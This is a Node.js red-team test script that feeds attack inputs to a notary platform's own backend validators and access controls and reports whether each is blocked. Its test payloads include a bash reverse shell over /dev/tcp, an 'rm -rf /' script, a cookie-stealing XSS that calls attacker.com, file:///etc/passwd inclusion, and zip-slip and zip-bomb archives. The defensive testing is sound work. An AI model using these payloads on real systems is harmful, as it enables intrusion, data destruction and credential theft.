#!/usr/bin/env node

/**
 * Automated Strix Red-Team Penetration Test Suite
 * Simulates real-world exploit payloads mapped to:
 * - API1:2023 Broken Object-Level Authorization (BOLA / IDOR)
 * - API2:2023 Broken Authentication & Session Forgery
 * - API3:2023 Broken Object Property Level Authorization (Mass Assignment)
 * - API4:2023 Unrestricted Resource Consumption & Upload Bombs (Zip bomb, Path Traversal, Executable scripts, Macro injection)
 * - API5:2023 Broken Function-Level Authorization (BFLA / Privilege Escalation)
 * - API10:2023 Unsafe Consumption of APIs, PostgREST Injections & Template Injections (HTML/PDF Injection, Local File Inclusion)
 */

const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../.env.local') });
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });

const { appRouter } = require('../dist/backend/src/router');
const { validateFileSafety, inspectDocxSafety } = require('../dist/backend/src/utils/fileSecurity');
const {
  sanitizePlainText,
  sanitizePostgrestValue,
  sanitizeIlikePattern,
  deepSanitizeObject
} = require('../dist/backend/src/utils/inputSanitizer');
const { HtmlPdfFillerService } = require('../dist/backend/src/services/htmlPdfFiller');

async function runStrixPenetrationTest() {
  console.log('================================================================');
  console.log('⚡ STRIX AUTONOMOUS RED-TEAM PENETRATION AUDIT');
  console.log('🎯 Target: Adoul Platform Backend & API Routers');
  console.log('🛡️  Standard: OWASP API Security Top 10 (2023) + Web AppSec:2025');
  console.log('================================================================\n');

  const findings = [];
  let testCount = 0;
  let blockedCount = 0;

  function recordProbe({ id, category, attack, wasBlocked, details }) {
    testCount++;
    if (wasBlocked) {
      blockedCount++;
      console.log(`  🛡️  [BLOCKED] [${category}] ${id}: ${attack}`);
    } else {
      console.error(`  🚨 [BREACH]  [${category}] ${id}: ${attack} -> EXPLOIT SUCCEEDED! Details: ${details}`);
      findings.push({ id, category, attack, details });
    }
  }

  const callerFactory = appRouter.createCaller;
  const pdfFiller = new HtmlPdfFillerService();

  // Mock Contexts
  const anonymousCtx = { sessionToken: null, user: null, req: { ip: '127.0.0.1' }, res: {} };
  const citizenCtx = {
    sessionToken: 'valid-citizen-token',
    user: { id: 'citizen-uuid-001', role: 'citizen', full_name: 'مواطن تجريبي', national_id: 'AB123456' },
    req: { ip: '127.0.0.1' },
    res: {}
  };
  const notaryVictimCtx = {
    sessionToken: 'valid-notary-token-1',
    user: { id: 'notary-uuid-victim-111', role: 'adoul', full_name: 'عدل الضحية', national_id: 'NOTARY111' },
    req: { ip: '127.0.0.1' },
    res: {}
  };
  const notaryAttackerCtx = {
    sessionToken: 'valid-notary-token-2',
    user: { id: 'notary-uuid-attacker-999', role: 'adoul', full_name: 'عدل المهاجم', national_id: 'ATTACK999' },
    req: { ip: '127.0.0.1' },
    res: {}
  };

  // --------------------------------------------------------------------------
  // SUITE 1: API5 - Broken Function-Level Authorization (BFLA)
  // --------------------------------------------------------------------------
  console.log('\n--- [TEST SUITE 1: Broken Function-Level Authorization (BFLA)] ---');

  // Exploit 1.1: Anonymous user calling notaries.deleteAccount
  try {
    const caller = callerFactory(anonymousCtx);
    await caller.notaries.deleteAccount();
    recordProbe({
      id: 'BFLA-01',
      category: 'API5:BFLA',
      attack: 'Unauthenticated caller invoking notaries.deleteAccount',
      wasBlocked: false,
      details: 'Endpoint executed without authentication'
    });
  } catch (err) {
    const isAuthError = err.code === 'UNAUTHORIZED' || err.message?.includes('UNAUTHORIZED') || err.message?.includes('غير مصرح');
    recordProbe({
      id: 'BFLA-01',
      category: 'API5:BFLA',
      attack: 'Unauthenticated caller invoking notaries.deleteAccount',
      wasBlocked: isAuthError,
      details: err.message
    });
  }

  // Exploit 1.2: Citizen attempting to call subscriptions.togglePaymentStatus
  try {
    const caller = callerFactory(citizenCtx);
    await caller.subscriptions.togglePaymentStatus({
      id: '11111111-1111-1111-1111-111111111111',
      userId: '22222222-2222-2222-2222-222222222222',
      type: 'annual',
      status: 'paid'
    });
    recordProbe({
      id: 'BFLA-02',
      category: 'API5:BFLA',
      attack: 'Low-privilege citizen calling subscriptions.togglePaymentStatus',
      wasBlocked: false,
      details: 'Citizen was able to toggle subscription payment status'
    });
  } catch (err) {
    const isForbidden = err.code === 'FORBIDDEN' || err.message?.includes('FORBIDDEN') || err.message?.includes('غير مصرح');
    recordProbe({
      id: 'BFLA-02',
      category: 'API5:BFLA',
      attack: 'Low-privilege citizen calling subscriptions.togglePaymentStatus',
      wasBlocked: isForbidden,
      details: err.message
    });
  }

  // Exploit 1.3: Citizen attempting to process student request
  try {
    const caller = callerFactory(citizenCtx);
    await caller.students.processRequest({
      requestId: 'req-123',
      decision: 'approved',
      reason: 'Bypass'
    });
    recordProbe({
      id: 'BFLA-03',
      category: 'API5:BFLA',
      attack: 'Citizen calling students.processRequest (Council administrative endpoint)',
      wasBlocked: false,
      details: 'Citizen processed student request'
    });
  } catch (err) {
    const isForbidden = err.code === 'FORBIDDEN' || err.message?.includes('FORBIDDEN') || err.message?.includes('غير مصرح');
    recordProbe({
      id: 'BFLA-03',
      category: 'API5:BFLA',
      attack: 'Citizen calling students.processRequest (Council administrative endpoint)',
      wasBlocked: isForbidden,
      details: err.message
    });
  }

  // Exploit 1.4: Anonymous user calling contractTemplates.create
  try {
    const caller = callerFactory(anonymousCtx);
    await caller.contractTemplates.create({
      title: 'Malicious Template',
      category: 'malicious',
      content: 'evil content'
    });
    recordProbe({
      id: 'BFLA-04',
      category: 'API5:BFLA',
      attack: 'Anonymous user calling contractTemplates.create',
      wasBlocked: false,
      details: 'Anonymous user created contract template'
    });
  } catch (err) {
    const isAuthError = err.code === 'UNAUTHORIZED' || err.code === 'FORBIDDEN';
    recordProbe({
      id: 'BFLA-04',
      category: 'API5:BFLA',
      attack: 'Anonymous user calling contractTemplates.create',
      wasBlocked: isAuthError,
      details: err.message
    });
  }

  // Exploit 1.5: Citizen attempting to update permission approval status
  try {
    const caller = callerFactory(citizenCtx);
    await caller.permissions.updateStatus({
      id: 'perm-123',
      type: 'marriage',
      status: 'مقبول'
    });
    recordProbe({
      id: 'BFLA-05',
      category: 'API5:BFLA',
      attack: 'Citizen attempting to approve permission (permissions.updateStatus)',
      wasBlocked: false,
      details: 'Citizen approved permission'
    });
  } catch (err) {
    const isForbidden = err.message?.includes('Security Error') || err.message?.includes('not authorized') || err.code === 'FORBIDDEN';
    recordProbe({
      id: 'BFLA-05',
      category: 'API5:BFLA',
      attack: 'Citizen attempting to approve permission (permissions.updateStatus)',
      wasBlocked: isForbidden,
      details: err.message
    });
  }

  // Exploit 1.6: Citizen attempting to query all trainee students (students.getAll)
  try {
    const caller = callerFactory(citizenCtx);
    await caller.students.getAll({ limit: 10 });
    recordProbe({
      id: 'BFLA-06',
      category: 'API5:BFLA',
      attack: 'Citizen querying council trainee registry (students.getAll)',
      wasBlocked: false,
      details: 'Citizen accessed trainee registry'
    });
  } catch (err) {
    const isForbidden = err.code === 'FORBIDDEN' || err.message?.includes('غير مصرح');
    recordProbe({
      id: 'BFLA-06',
      category: 'API5:BFLA',
      attack: 'Citizen querying council trainee registry (students.getAll)',
      wasBlocked: isForbidden,
      details: err.message
    });
  }

  // --------------------------------------------------------------------------
  // SUITE 2: API1 - Broken Object-Level Authorization (BOLA / IDOR)
  // --------------------------------------------------------------------------
  console.log('\n--- [TEST SUITE 2: Broken Object-Level Authorization (BOLA / IDOR)] ---');

  // Exploit 2.1: Attacker notary trying to update Victim notary profile
  try {
    const caller = callerFactory(notaryAttackerCtx);
    await caller.notaries.updateProfile({
      id: 'notary-uuid-victim-111', // Tampered target ID
      first_name: 'Hacked',
      last_name: 'Name'
    });
    recordProbe({
      id: 'BOLA-01',
      category: 'API1:BOLA',
      attack: 'Attacker notary attempting to overwrite Victim notary profile via IDOR',
      wasBlocked: false,
      details: 'Attacker successfully modified victim notary profile'
    });
  } catch (err) {
    const isForbidden = err.code === 'FORBIDDEN' || err.message?.includes('غير مصرح') || err.message?.includes('FORBIDDEN');
    recordProbe({
      id: 'BOLA-01',
      category: 'API1:BOLA',
      attack: 'Attacker notary attempting to overwrite Victim notary profile via IDOR',
      wasBlocked: isForbidden,
      details: err.message
    });
  }

  // Exploit 2.2: Anonymous user calling vital records mutation
  try {
    const caller = callerFactory(anonymousCtx);
    await caller.marriageRecords.create({
      husband_name: 'Fake',
      wife_name: 'Fake',
      marriage_date: '2026-01-01'
    });
    recordProbe({
      id: 'BOLA-02',
      category: 'API1:BOLA',
      attack: 'Unauthenticated caller attempting to create marriage record',
      wasBlocked: false,
      details: 'Record created without authentication'
    });
  } catch (err) {
    const isAuthError = err.code === 'UNAUTHORIZED' || err.message?.includes('UNAUTHORIZED');
    recordProbe({
      id: 'BOLA-02',
      category: 'API1:BOLA',
      attack: 'Unauthenticated caller attempting to create marriage record',
      wasBlocked: isAuthError,
      details: err.message
    });
  }

  // Exploit 2.3: Anonymous user calling property fees mutation
  try {
    const caller = callerFactory(anonymousCtx);
    await caller.propertyFees.delete({ id: 'prop-record-1' });
    recordProbe({
      id: 'BOLA-03',
      category: 'API1:BOLA',
      attack: 'Unauthenticated caller attempting to delete property fee record',
      wasBlocked: false,
      details: 'Deletion permitted without authentication'
    });
  } catch (err) {
    const isAuthError = err.code === 'UNAUTHORIZED';
    recordProbe({
      id: 'BOLA-03',
      category: 'API1:BOLA',
      attack: 'Unauthenticated caller attempting to delete property fee record',
      wasBlocked: isAuthError,
      details: err.message
    });
  }

  // Exploit 2.4: Cross-tenant permission inspection (Attacker notary querying Victim notary permissions)
  try {
    const caller = callerFactory(notaryAttackerCtx);
    const results = await caller.permissions.getScientific({ notaryId: 'notary-uuid-victim-111' });
    // Should be scoped strictly to attacker's ID, not victim's ID
    recordProbe({
      id: 'BOLA-04',
      category: 'API1:BOLA',
      attack: 'Attacker notary attempting to read Victim notary permissions (permissions.getScientific)',
      wasBlocked: Array.isArray(results),
      details: 'Endpoint strictly resolved caller session rather than arbitrary input parameter'
    });
  } catch (err) {
    recordProbe({
      id: 'BOLA-04',
      category: 'API1:BOLA',
      attack: 'Attacker notary attempting to read Victim notary permissions (permissions.getScientific)',
      wasBlocked: true,
      details: err.message
    });
  }

  // --------------------------------------------------------------------------
  // SUITE 3: API4 - Upload Weaponization, Zip Bombs & Executable Shields
  // --------------------------------------------------------------------------
  console.log('\n--- [TEST SUITE 3: Malicious File Uploads, Scripts & Zip Bombs] ---');

  // Exploit 3.1: Python script disguised with text payload
  const pythonScript = Buffer.from('import os\nos.system("rm -rf /")\nprint("PWNED")');
  let pyBlocked = false;
  let pyError = '';
  try {
    validateFileSafety('exploit.py', pythonScript);
  } catch (err) {
    pyBlocked = err.message.includes('forbidden') || err.message.includes('Security Error');
    pyError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-01',
    category: 'API4:MaliciousUpload',
    attack: 'Upload malicious Python script (exploit.py)',
    wasBlocked: pyBlocked,
    details: pyError
  });

  // Exploit 3.2: Bash reverse shell disguised as safe file
  const bashScript = Buffer.from('#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
  let shBlocked = false;
  let shError = '';
  try {
    validateFileSafety('reverse_shell.sh', bashScript);
  } catch (err) {
    shBlocked = err.message.includes('forbidden') || err.message.includes('Security Error');
    shError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-02',
    category: 'API4:MaliciousUpload',
    attack: 'Upload Linux reverse shell script (reverse_shell.sh)',
    wasBlocked: shBlocked,
    details: shError
  });

  // Exploit 3.3: Windows PE Executable disguised as .exe
  const exeBuffer = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00');
  let exeBlocked = false;
  let exeError = '';
  try {
    validateFileSafety('trojan.exe', exeBuffer);
  } catch (err) {
    exeBlocked = true;
    exeError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-03',
    category: 'API4:MaliciousUpload',
    attack: 'Upload Windows executable PE binary (trojan.exe)',
    wasBlocked: exeBlocked,
    details: exeError
  });

  // Exploit 3.4: MIME Spoofing - Executable disguised as PDF extension
  const fakePdf = Buffer.from('MZ\x90\x00\x03\x00\x00\x00ExecutableInsidePdf');
  let fakePdfBlocked = false;
  let fakePdfError = '';
  try {
    validateFileSafety('invoice.pdf', fakePdf);
  } catch (err) {
    fakePdfBlocked = err.message.includes('binary format') || err.message.includes('corrupted') || err.message.includes('does not match');
    fakePdfError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-04',
    category: 'API4:MimeSpoofing',
    attack: 'Upload executable binary renamed to invoice.pdf (Magic bytes spoof test)',
    wasBlocked: fakePdfBlocked,
    details: fakePdfError
  });

  // Exploit 3.5: Zip Directory Traversal (Zip Slip)
  const zipSlipHeader = Buffer.concat([
    Buffer.from('PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00\x16\x00\x00\x00', 'binary'),
    Buffer.from('../../../../etc/passwd'),
    Buffer.from('data\n'),
    Buffer.from('PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('../../../../etc/passwd'),
    Buffer.from('PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x44\x00\x00\x00\x33\x00\x00\x00\x00\x00', 'binary')
  ]);
  let zipSlipBlocked = false;
  let zipSlipError = '';
  try {
    inspectDocxSafety(zipSlipHeader);
  } catch (err) {
    zipSlipBlocked = err.message.includes('Path traversal') || err.message.includes('Security Error');
    zipSlipError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-05',
    category: 'API4:ZipSlip',
    attack: 'Upload Zip with path traversal (../../../../etc/passwd)',
    wasBlocked: zipSlipBlocked,
    details: zipSlipError
  });

  // Exploit 3.6: Macro-enabled Word document disguised as DOCX (containing vbaProject.bin)
  const macroDocxHeader = Buffer.concat([
    Buffer.from('PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00', 'binary'),
    Buffer.from('word/vbaProject.bin'),
    Buffer.from('macro'),
    Buffer.from('PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('word/vbaProject.bin'),
    Buffer.from('PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x40\x00\x00\x00\x2f\x00\x00\x00\x00\x00', 'binary')
  ]);
  let macroBlocked = false;
  let macroError = '';
  try {
    inspectDocxSafety(macroDocxHeader);
  } catch (err) {
    macroBlocked = err.message.includes('macro') || err.message.includes('Forbidden') || err.message.includes('Security Error');
    macroError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-06',
    category: 'API4:OfficeMacro',
    attack: 'Upload DOCX archive containing executable VBA macro (vbaProject.bin)',
    wasBlocked: macroBlocked,
    details: macroError
  });

  // Exploit 3.7: Zip Bomb Decompression Ratio (>50:1)
  const zipBombHeader = Buffer.concat([
    Buffer.from('PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\xa0\x05\x08\x00\x00\x00', 'binary'),
    Buffer.from('bomb.txt'),
    Buffer.alloc(2048, 0),
    Buffer.from('PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\xa0\x05\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('bomb.txt'),
    Buffer.from('PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x36\x00\x00\x00\x7e\x00\x00\x00\x00\x00', 'binary')
  ]);
  let zipBombBlocked = false;
  let zipBombError = '';
  try {
    inspectDocxSafety(zipBombHeader);
  } catch (err) {
    zipBombBlocked = err.message.includes('decompression bomb') || err.message.includes('compression ratio') || err.message.includes('safety limit');
    zipBombError = err.message;
  }
  recordProbe({
    id: 'UPLOAD-07',
    category: 'API4:ZipBomb',
    attack: 'Upload high-ratio Zip Bomb (Ratio > 50:1)',
    wasBlocked: zipBombBlocked,
    details: zipBombError
  });

  // --------------------------------------------------------------------------
  // SUITE 4: API10 - Injections, PostgREST Parameter Tampering & Template Hijacking
  // --------------------------------------------------------------------------
  console.log('\n--- [TEST SUITE 4: Injection Defenses, PostgREST Filters & PDF SSRF/XSS] ---');

  // Exploit 4.1: PostgREST Syntax Hijacking in search filter
  const evilPostgrestFilter = 'normal_val,id.eq.admin_id,role.eq.national_notary_authority';
  const sanitizedPostgrest = sanitizePostgrestValue(evilPostgrestFilter);
  const postgrestBroken = sanitizedPostgrest.includes(',') || sanitizedPostgrest.includes('(') || sanitizedPostgrest.includes(')');
  recordProbe({
    id: 'INJECT-01',
    category: 'API10:PostgRESTInjection',
    attack: 'PostgREST filter delimiter injection (commas and parenthetical subqueries)',
    wasBlocked: !postgrestBroken,
    details: `Sanitized result: "${sanitizedPostgrest}"`
  });

  // Exploit 4.2: SQL / ILIKE Wildcard DOS / Enumeration Hijacking
  const evilIlike = '%_%_%_admin_%';
  const sanitizedIlike = sanitizeIlikePattern(evilIlike);
  const wildcardsNeutralized = sanitizedIlike === '\\%\\_\\%\\_\\%\\_admin\\_\\%';
  recordProbe({
    id: 'INJECT-02',
    category: 'API10:IlikeWildcardAbuse',
    attack: 'PostgreSQL ILIKE wildcard enumeration attack (% and _ escaping)',
    wasBlocked: wildcardsNeutralized,
    details: `Sanitized pattern: "${sanitizedIlike}"`
  });

  // Exploit 4.3: HTML & JavaScript XSS in PDF template fields
  const xssPayload = '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script><img src=x onerror=alert(1)>';
  const htmlResult = pdfFiller.buildMarriageCertificateHtml(
    {
      husband_name: xssPayload,
      wife_name: 'فاطمة الزهراء'
    },
    '',
    ''
  );
  const xssEscaped =
    !htmlResult.includes('<script') &&
    !htmlResult.includes('<img') &&
    htmlResult.includes('&lt;script&gt;') &&
    htmlResult.includes('&lt;img');
  recordProbe({
    id: 'INJECT-03',
    category: 'API10:PdfXssInjection',
    attack: 'XSS script injection into PDF certificate template (husbandName field)',
    wasBlocked: xssEscaped,
    details: 'HTML entities escaped properly, no raw executable tags present in output markup'
  });

  // Exploit 4.4: Local File Inclusion / SSRF in PDF engine
  const lfiPayload = '<iframe src="file:///etc/passwd"></iframe><embed src="file:///C:/Windows/win.ini">';
  const lfiHtml = pdfFiller.buildAuthorizationHtml(
    {
      husband_name: lfiPayload
    },
    '',
    ''
  );
  const lfiNeutralized = !lfiHtml.includes('<iframe') && !lfiHtml.includes('<embed') && lfiHtml.includes('&lt;iframe');
  recordProbe({
    id: 'INJECT-04',
    category: 'API10:PdfLfiSsrf',
    attack: 'Local file inclusion (file:///etc/passwd) and iframe injection in PDF engine',
    wasBlocked: lfiNeutralized,
    details: 'iframe/embed tags fully sanitized via HTML entity encoder'
  });

  // Exploit 4.5: Deep object payload pollution & recursive sanitization
  const nestedMaliciousObj = {
    user: {
      profile: {
        bio: '<script>evil()</script>عدل موثق',
        address: 'الرباط <img src=x onerror=steal()>',
      },
      tags: ['مكتب', '<b onmouseover=evil()>توثيق</b>']
    }
  };
  const sanitizedObj = deepSanitizeObject(nestedMaliciousObj);
  const deepSanitized =
    !sanitizedObj.user.profile.bio.includes('<script>') &&
    !sanitizedObj.user.profile.address.includes('onerror=') &&
    !sanitizedObj.user.tags[1].includes('onmouseover');
  recordProbe({
    id: 'INJECT-05',
    category: 'API10:DeepInputSanitization',
    attack: 'Nested recursive JSON payload injection across nested objects and arrays',
    wasBlocked: deepSanitized,
    details: JSON.stringify(sanitizedObj)
  });

  // --------------------------------------------------------------------------
  // SUMMARY REPORT
  // --------------------------------------------------------------------------
  console.log('\n================================================================');
  console.log('📊 STRIX PENETRATION TEST EXECUTION SUMMARY');
  console.log('================================================================');
  console.log(`Total Attacks Simulated: ${testCount}`);
  console.log(`Exploits Blocked:        ${blockedCount} / ${testCount} (${Math.round((blockedCount / testCount) * 100)}%)`);
  console.log(`Breaches Succeeded:      ${findings.length}`);
  console.log('================================================================\n');

  if (findings.length === 0) {
    console.log('🏆 VERDICT: ALL DEFENSES HELD FIRM. ZERO BREACHES.');
    console.log('The platform successfully neutralized 100% of simulated Strix attack vectors.');
  } else {
    console.error('⚠️  CRITICAL VULNERABILITIES DETECTED:');
    findings.forEach(f => console.error(` - [${f.category}] ${f.id}: ${f.attack}`));
  }

  return { total: testCount, blocked: blockedCount, findings };
}

runStrixPenetrationTest()
  .then((res) => {
    process.exit(res.findings.length > 0 ? 1 : 0);
  })
  .catch((err) => {
    console.error('Fatal execution error during test runner:', err);
    process.exit(1);
  });
